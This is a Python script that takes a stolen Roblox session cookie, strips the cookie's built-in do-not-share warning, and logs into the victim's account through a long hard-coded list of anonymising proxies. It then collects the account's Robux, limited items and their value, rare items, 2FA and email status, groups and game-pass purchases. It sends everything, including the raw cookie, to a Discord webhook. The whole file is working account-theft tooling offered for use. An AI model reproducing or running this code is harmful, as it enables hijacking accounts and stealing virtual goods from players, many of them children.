import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone

# --- Updated Proxy List ---
RAW_PROXY_LIST = """
socks4://165.99.90.2:1080
socks4://72.195.34.41:4145
socks4://98.170.57.249:4145
socks5://192.111.130.5:17002
socks5://72.195.114.184:4145
socks5://45.74.31.40:15662
socks5://47.238.128.246:18080
socks5://45.74.31.41:17812
socks5://8.220.136.174:1081
socks5://47.91.89.3:139
socks5://45.74.31.40:16595
socks5://45.74.31.47:7059
socks5://8.220.204.92:30001
socks5://45.74.31.41:15628
socks5://8.211.51.115:9080
socks5://47.238.128.246:9080
socks5://45.74.31.42:12350
socks5://45.74.31.42:30219
socks5://45.74.31.42:20545
socks5://47.250.51.110:13
socks5://45.74.31.41:26288
socks5://39.102.209.121:8080
socks5://45.74.31.40:8089
socks5://121.169.46.116:1090
socks5://67.207.92.87:1088
socks5://8.212.168.170:999
socks5://45.74.31.40:6583
socks5://156.225.31.18:7890
socks5://45.74.31.46:10273
socks5://8.213.134.213:18080
socks5://45.74.31.41:17759
socks5://72.195.34.58:4145
socks5://45.74.31.42:9916
socks4://72.207.33.64:4145
socks5://47.250.159.65:8005
socks5://45.74.31.47:17575
socks5://47.121.182.36:8888
socks5://47.238.60.156:8888
socks5://47.250.177.202:1080
socks4://185.244.158.4:3129
socks5://45.74.31.42:4459
socks5://101.36.104.46:10808
socks5://47.89.159.212:8443
socks5://45.74.31.46:6965
socks5://8.211.194.78:5060
socks5://45.74.31.42:15801
socks5://45.74.31.40:12485
socks5://47.238.134.126:8080
socks5://45.74.31.40:11524
socks5://45.74.31.42:8281
socks5://47.116.126.57:10000
socks5://45.74.31.47:7433
socks5://45.74.31.47:5988
socks5://45.61.129.165:9050
socks5://8.213.128.6:6666
socks5://45.74.31.41:17186
socks5://45.74.31.46:4427
socks5://192.252.220.92:17328
socks5://8.211.42.167:1080
socks5://45.74.31.42:4780
socks5://72.205.0.93:4145
socks5://39.104.27.89:8008
socks5://45.74.31.42:15428
socks5://45.74.31.42:6973
socks4://94.247.241.70:51006
socks5://45.74.31.41:15297
socks5://45.194.33.12:30001
socks4://192.111.137.35:4145
socks5://217.142.236.180:1080
socks5://45.74.31.46:10363
socks5://45.74.31.40:16817
socks5://45.74.31.41:10253
socks4://165.154.20.187:10808
socks5://47.104.198.111:8080
socks5://45.74.31.42:17793
socks5://8.211.200.183:100
http://145.220.227.24:8080
socks5://47.76.144.139:8081
socks5://47.250.11.111:51
socks5://134.209.29.120:1080
socks4://42.114.62.76:20001
socks5://45.74.31.40:9443
socks5://45.74.31.42:17496
socks5://47.251.74.38:4840
socks5://8.220.204.215:90
socks5://45.74.31.42:8206
http://115.127.166.86:8080
http://157.15.144.81:1111
socks5://132.226.7.23:30277
http://41.196.16.226:1981
socks5://8.213.215.187:2000
socks5://103.136.107.70:1080
http://140.246.125.194:9099
http://45.65.226.173:999
socks5://45.74.31.40:11198
socks5://45.74.31.47:5355
socks5://103.191.218.119:69
socks4://154.221.24.92:1080
http://52.229.30.3:80
http://163.128.32.26:8080
http://112.203.204.176:8082
socks5://45.74.31.46:7465
socks5://47.251.73.54:9098
socks5://45.74.31.40:5950
socks5://45.74.31.40:13764
http://103.156.233.57:8080
socks5://5.255.117.250:1080
http://103.171.241.18:1000
socks5://191.44.108.25:1080
socks5://45.74.31.42:8314
socks5://45.74.31.41:12529
socks5://45.74.31.46:6585
socks5://45.74.31.40:9574
http://195.123.212.87:3056
socks5://45.74.31.47:6720
socks5://45.74.31.46:12959
socks5://45.74.31.40:12749
socks5://45.74.31.41:22738
socks4://202.146.230.102:1080
socks4://89.186.8.107:1080
socks5://45.74.31.42:5640
socks5://47.105.122.72:8080
socks4://47.112.11.170:8090
socks5://192.252.211.197:14921
socks5://45.74.31.46:17952
http://103.156.71.122:3128
socks5://45.74.31.40:15020
socks5://199.66.183.251:4145
http://203.205.49.2:10026
socks5://45.74.31.40:9403
socks4://27.68.169.53:1080
socks5://45.74.31.42:15707
socks5://106.14.104.220:8009
socks5://101.132.249.207:1337
socks5://45.74.31.42:4702
http://203.76.220.126:16464
socks5://113.249.111.67:1080
socks5://39.102.209.128:9098
socks5://47.90.167.27:8880
socks5://45.74.31.47:9159
socks5://45.74.31.40:11569
socks5://45.74.31.46:9825
http://122.246.4.30:17981
socks5://45.74.31.46:8502
http://102.244.78.61:8086
socks5://45.74.31.46:7311
socks5://45.74.31.47:32010
socks5://8.138.125.130:9098
socks5://8.221.139.222:8008
socks5://47.237.113.119:14
http://103.70.146.66:8080
socks4://45.56.71.129:1081
socks5://47.92.194.235:3129
socks5://45.74.31.42:15791
socks5://47.121.182.88:9098
socks5://45.74.31.41:15832
socks5://45.74.31.40:5152
socks5://199.66.182.243:4145
socks5://45.74.31.41:15886
socks5://45.74.31.41:5457
socks5://45.74.31.42:9825
socks5://103.155.184.51:9898
socks5://68.71.251.134:4145
socks5://8.213.222.247:8080
socks5://45.74.31.42:6715
socks5://45.74.31.42:13793
socks5://45.74.31.42:9066
socks5://23.95.226.15:1080
socks5://45.74.31.46:4628
socks5://149.129.226.9:8888
socks5://68.1.210.163:4145
http://18.142.95.213:54412
socks5://45.74.31.40:6226
socks5://45.74.31.40:12469
socks5://45.74.31.47:9517
http://34.111.147.163:80
socks5://47.237.92.86:80
http://103.172.121.28:8080
http://103.168.149.60:8181
socks5://45.74.31.42:7509
socks5://45.74.31.42:17477
socks5://45.74.31.41:10155
socks5://129.153.105.194:9050
socks5://47.91.109.17:8000
socks5://8.220.141.8:51
socks5://107.181.168.145:4145
http://47.119.164.33:1081
http://123.58.199.232:8168
socks5://45.74.31.46:11091
socks4://64.176.221.15:1080
socks5://45.74.31.42:30140
socks5://8.211.195.139:28737
socks5://184.181.178.33:4145
http://110.93.236.171:8080
socks5://47.88.94.79:1080
socks5://45.74.31.47:17094
socks5://45.74.31.46:5013
socks4://42.114.56.7:20001
socks5://79.134.4.225:1080
socks5://185.87.199.40:1080
socks5://47.252.18.37:8060
socks5://8.221.141.88:161
socks5://192.111.129.145:16894
http://203.95.196.8:8080
socks5://193.25.215.182:22222
http://195.13.182.210:20612
http://157.66.218.214:22263
http://62.109.0.179:80
socks5://45.74.31.42:5952
socks5://45.74.31.42:35226
socks5://187.127.140.233:1080
socks5://109.191.114.251:1080
socks5://8.212.165.164:808
http://34.102.241.71:80
socks5://47.91.29.151:9098
http://177.234.208.111:999
socks4://182.160.16.234:8020
socks5://143.198.90.221:1088
socks5://47.91.29.151:3129
socks5://79.134.4.192:1080
http://103.158.252.99:80
socks5://98.181.137.83:4145
http://89.45.209.131:8080
socks5://78.109.137.53:1080
http://45.133.107.128:81
http://45.174.243.160:999
socks5://45.74.31.47:8132
socks5://158.101.15.1:443
socks5://45.74.31.47:14113
socks5://39.102.211.162:8090
http://47.107.166.143:3128
socks5://45.194.33.12:30002
socks5://47.119.19.221:8085
http://178.83.46.167:3128
socks5://45.74.31.40:5696
socks5://8.146.200.53:8080
socks5://220.158.232.118:1080
socks5://45.74.31.47:9364
socks5://94.230.127.180:1080
socks5://45.74.31.47:12858
http://46.47.197.210:3128
socks5://45.74.31.40:8858
socks5://45.74.31.42:9104
socks5://160.30.204.24:50001
http://160.20.38.34:3125
socks5://45.74.31.42:15298
http://110.40.157.223:80
http://203.150.113.45:8080
socks5://98.170.57.231:4145
http://91.185.193.115:8080
http://186.148.182.106:999
socks5://110.238.109.146:55443
socks5://45.74.31.42:16368
socks5://39.102.209.163:9999
http://51.161.142.97:8080
socks5://199.66.183.226:4145
socks5://112.5.33.179:999
http://103.191.169.126:8080
socks5://45.74.31.46:7832
socks5://45.74.31.47:9224
http://185.195.254.72:5432
socks5://45.74.31.42:15592
socks5://184.181.217.206:4145
socks4://163.61.245.73:1081
socks5://47.254.36.213:8085
socks4://177.73.77.19:4153
socks5://45.74.31.46:17024
socks5://45.74.31.40:17444
socks5://45.74.31.41:14169
socks5://8.211.49.86:2000
socks4://69.61.200.104:36181
socks5://45.74.31.46:9371
socks5://212.46.245.189:1080
http://34.136.200.110:80
socks5://45.74.31.47:7432
socks5://184.178.172.3:4145
http://114.215.127.92:100
socks5://45.74.31.40:14543
socks5://47.251.87.74:85
socks5://47.91.121.127:20
socks5://39.102.214.199:3128
http://47.242.218.151:9012
http://180.191.120.247:5050
socks5://155.138.221.32:1082
socks5://45.74.31.42:10148
socks5://149.129.255.179:8888
socks5://8.138.133.207:9080
http://20.204.43.57:80
socks4://24.249.199.12:4145
socks5://47.252.11.233:8080
http://18.157.159.247:9002
socks5://45.74.31.42:10850
socks5://45.74.31.41:12342
socks5://45.74.31.47:16092
socks5://45.74.31.46:11098
socks4://103.42.202.190:1080
http://179.1.127.194:8080
socks5://45.74.31.47:5330
socks5://45.74.31.41:16544
http://56.155.73.159:27549
socks5://45.74.31.42:21251
socks5://45.74.31.42:32682
http://103.168.254.198:8080
socks5://45.74.31.40:12113
socks5://8.215.15.163:50
socks4://116.106.110.135:1080
socks5://45.74.31.40:17211
socks5://72.206.74.126:4145
socks5://43.245.199.34:1080
socks5://45.74.31.47:14341
socks4://8.213.197.208:8085
http://101.204.221.88:10808
socks5://45.74.31.47:13533
socks5://45.74.31.42:5746
socks4://103.177.20.27:1080
socks5://45.74.31.40:16713
socks5://8.148.4.166:9098
socks5://45.74.31.40:16275
socks5://45.74.31.46:12856
socks5://70.166.65.160:4145
socks5://47.91.120.190:13
http://103.173.72.25:1111
socks5://45.74.31.42:13988
socks5://8.209.96.245:45
socks5://45.74.31.47:15800
http://139.224.207.73:3129
socks5://8.220.205.172:80
socks5://8.212.151.166:9050
socks5://45.74.31.40:16971
socks5://45.74.31.47:16616
socks5://45.74.31.40:13960
socks4://184.182.240.211:4145
socks5://121.43.109.88:8081
socks5://45.74.31.42:7781
http://118.25.131.160:10039
socks5://39.102.213.3:20000
socks5://65.21.252.66:10808
socks5://45.74.31.42:16685
socks5://45.74.31.41:7286
socks5://8.210.17.35:4002
socks5://8.130.36.163:80
socks5://45.74.31.46:14073
socks5://45.74.31.46:10369
http://163.61.129.194:8080
socks4://159.138.252.45:8888
socks4://50.114.58.15:1080
socks5://45.74.31.40:8594
socks5://120.26.104.146:8008
socks5://47.104.27.165:9080
socks5://47.119.22.156:9080
socks4://42.113.232.95:20001
http://39.104.69.76:6379
socks5://142.54.226.214:4145
socks5://45.74.31.47:14100
http://139.224.186.221:1337
socks5://45.74.31.42:15011
http://103.26.128.203:8181
socks5://8.213.156.191:13
socks5://120.79.7.173:8085
socks5://45.74.31.42:11271
http://203.190.53.210:8080
socks5://45.74.31.41:9381
http://106.55.158.62:3128
socks5://45.74.31.47:6175
socks5://45.74.31.42:13630
socks4://103.23.100.9:1080
socks5://45.74.31.40:10603
http://101.36.112.205:1081
socks5://47.116.181.146:8800
socks5://45.74.31.41:12413
socks5://45.74.31.46:10405
socks5://45.74.31.42:17135
socks5://45.74.31.40:4595
socks5://45.74.31.40:12131
socks5://120.25.189.254:8008
socks5://47.121.133.212:4006
socks5://39.104.59.56:80
socks5://47.87.97.94:1080
socks5://45.74.31.40:8465
socks5://57.129.182.181:1080
http://188.164.201.197:666
socks5://45.74.31.41:37356
socks5://45.74.31.47:10443
socks5://45.74.31.47:7066
socks5://45.74.31.42:16933
http://103.188.173.101:1080
"""

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    
    if len(raw_str) < 30 and not raw_str.startswith("sys") and not raw_str.startswith("_|WARNING"):
        return None

    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    
    cleaned = cookie.lstrip('.').rstrip(';').strip()
    if len(cleaned) < 50:
        return None
        
    return cleaned

def get_working_session(roblosecurity):
    session = requests.Session()
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com/"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    proxies_to_try = [manual_proxy] if manual_proxy else []
    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
    random.shuffle(parsed_proxies)
    proxies_to_try.extend(parsed_proxies)

    for p in proxies_to_try:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
            if test_res.status_code == 200:
                return session
        except Exception:
            continue

    session.proxies = {}
    return session

def main():
    if len(sys.argv) < 2:
        sys.exit(1)
    
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not webhook_url:
        sys.exit(1)

    raw_cookie = extract_and_clean_cookie(sys.argv[1])
    if not raw_cookie:
        sys.exit(0)

    session = get_working_session(raw_cookie)

    auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
    if auth_res.status_code != 200:
        sys.exit(1)
    
    auth_data = auth_res.json()
    user_id = auth_data.get("id")
    if not user_id:
        sys.exit(1)

    username = auth_data.get("name", "Unknown")
    display_name = auth_data.get("displayName", username)

    def safe_get(url, params=None):
        try:
            r = session.get(url, params=params, timeout=10)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return {}

    user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}")
    created = user_info.get("created", "")
    age_days = 0
    if created:
        try:
            created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
            age_days = (datetime.now(timezone.utc) - created_dt).days
        except Exception:
            pass

    robux_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
    robux = robux_res.get("robux", 0)

    trans_res = safe_get(
        f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
        params={"transactionType": "summary", "timeFrame": "Year"}
    )
    pending = trans_res.get("pendingRobuxTotal", 0)

    limiteds = []
    cursor = ""
    while True:
        params = {"limit": 100}
        if cursor:
            params["cursor"] = cursor
        r = safe_get(
            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
            params=params
        )
        if not isinstance(r, dict):
            break
        for item in r.get("data", []):
            limiteds.append(item.get("recentAveragePrice", 0))
        cursor = r.get("nextPageCursor")
        if not cursor:
            break

    rap = sum(limiteds)
    lim_count = len(limiteds)

    try:
        prem_res = session.get(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
            timeout=10
        )
        premium = prem_res.json() is True
    except Exception:
        premium = False

    def check_bundle(bundle_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned",
                timeout=10
            )
            return r.json() is True
        except Exception:
            return False

    def check_asset(asset_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned",
                timeout=10
            )
            return r.json() is True
        except Exception:
            return False

    korblox = check_bundle(192)
    headless = check_bundle(201)
    violet_valk = check_asset(799742571)

    groups_res = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles")
    groups = groups_res.get("data", [])
    group_count = len(groups)
    owned_groups = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)

    email_ver = safe_get("https://accountsettings.roblox.com/v1/email").get("verified", False)
    twofa = safe_get("https://twostepverification.roblox.com/v1/metadata").get("twoStepVerificationEnabled", False)

    def check_played_and_passes(universe_id):
        played = False
        cursor = ""
        while True:
            r = safe_get(
                f"https://badges.roblox.com/v1/users/{user_id}/badges",
                params={"limit": 100, "cursor": cursor}
            )
            if not isinstance(r, dict):
                break
            for badge in r.get("data", []):
                if badge.get("awardingUniverse", {}).get("id") == universe_id:
                    played = True
            cursor = r.get("nextPageCursor")
            if not cursor:
                break

        passes = 0
        cursor = ""
        while True:
            r = safe_get(
                f"https://economy.roblox.com/v2/users/{user_id}/transactions",
                params={"transactionType": "Purchase", "limit": 100, "cursor": cursor}
            )
            if not isinstance(r, dict):
                break
            for tx in r.get("data", []):
                details = tx.get("details", {})
                place = details.get("place", {})
                if place.get("universeId") == universe_id:
                    if details.get("type") == "GamePass":
                        passes += 1
                        played = True
            cursor = r.get("nextPageCursor")
            if not cursor:
                break

        return played, passes

    adopt_played, adopt_passes = check_played_and_passes(383310974)
    mm2_played, mm2_passes = check_played_and_passes(142823291)
    ps99_played, ps99_passes = check_played_and_passes(3259657279)

    avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

    payload = {
        "username": f"{username} | Stats",
        "avatar_url": avatar_url,
        "embeds": [
            {
                "title": f"🎮 {username} | Roblox Stats",
                "description": f"[Stats Link](https://www.rolimons.com/player/{user_id}) | [Roblox Profile](https://www.roblox.com/users/{user_id}/profile)",
                "color": 0x2B2D31,
                "thumbnail": {"url": avatar_url},
                "fields": [
                    {"name": "🐱 Username", "value": f"```{username}```", "inline": False},
                    {"name": "📋 Account Stats", "value": f"+ Account Age: `{age_days} Days`\n+ Premium: `{premium}`", "inline": False},
                    {"name": "🪙 Robux", "value": f"Balance: `{robux:,}`\nPending: `{pending:,}`", "inline": True},
                    {"name": "💎 Limiteds", "value": f"RAP: `{rap:,}`\nLimiteds: `{lim_count}`", "inline": True},
                    {"name": "👑 Special Items", "value": f"+ Korblox: `{korblox}`\n+ Headless: `{headless}`\n+ Violet Valk: `{violet_valk}`", "inline": False},
                    {"name": "⚙️ Settings", "value": f"+ Email Verified: `{email_ver}`\n+ 2FA: `{twofa}`", "inline": True},
                    {"name": "👥 Groups", "value": f"Owned: `{owned_groups}`\nJoined: `{group_count}`", "inline": True},
                    {"name": "⭐ Games", "value": f"- Adopt Me: `{adopt_played}` ({adopt_passes} passes)\n- MM2: `{mm2_played}` ({mm2_passes} passes)\n- PS99: `{ps99_played}` ({ps99_passes} passes)", "inline": False}
                ],
                "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
                "timestamp": datetime.now(timezone.utc).isoformat()
            },
            {
                "title": "🍪 Session Cookie Data",
                "description": f"```text\n{raw_cookie}\n```",
                "color": 0x2B2D31,
                "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
            }
        ],
        "allowed_mentions": {"parse": ["everyone"]}
    }

    requests.post(webhook_url, json=payload, timeout=5)

if __name__ == "__main__":
    main()
